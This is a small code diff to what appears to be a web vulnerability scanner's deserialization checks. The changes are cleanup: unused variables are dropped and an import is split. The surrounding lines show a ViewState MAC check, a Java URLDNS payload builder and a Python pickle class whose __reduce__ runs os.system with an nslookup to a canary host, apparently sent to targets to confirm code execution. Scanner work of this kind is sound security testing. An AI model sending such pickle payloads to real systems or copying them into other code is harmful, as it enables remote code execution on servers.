@@ -50,7 +50,6 @@ def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
     # Check for .NET ViewState without MAC validation
     viewstate_match = re.search(r'id="__VIEWSTATE"[^>]+value="([^"]+)"', page.body)
     if viewstate_match:
-        vs = viewstate_match.group(1)
         mac_match = re.search(r'id="__VIEWSTATEMAC"[^>]+value="([^"]+)"', page.body)
         if not mac_match or not mac_match.group(1):
             findings.append(Finding(
@@ -139,7 +138,6 @@ def _build_urldns_payload(url: str) -> bytes:
     path = parsed.path or "/"
     ref = parsed.fragment or ""
     authority = parsed.netloc or host
-    user_info = parsed.username or ""
     query = parsed.query or ""
     file_part = path + (("?" + query) if query else "")
 
@@ -214,7 +212,8 @@ def _send_pickle_payload(page: CrawlResult, client: httpx.Client, canary: str):
     Send a Python pickle payload that calls socket.gethostbyname(<canary>).
     Confirmed via OOB DNS callback.
     """
-    import pickle, os
+    import pickle
+    import os
     class _DNSProbe:
         def __reduce__(self):
             return (os.system, (f"nslookup {canary}",))
